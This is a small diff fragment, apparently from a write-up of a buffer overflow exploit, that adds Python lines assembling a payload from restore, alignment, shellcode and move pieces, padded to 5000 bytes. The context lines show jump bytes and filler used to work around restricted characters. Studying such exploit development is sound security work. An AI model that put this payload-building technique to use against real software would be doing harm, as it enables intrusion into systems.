@@ -208,4 +208,10 @@ payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can d
 payload += "\x41" * 124
 payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
 payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += restore
+payload += alignment
+payload += shellcode
+payload += move
+payload += "\x43" * (5000-len(payload))
+```
 ```
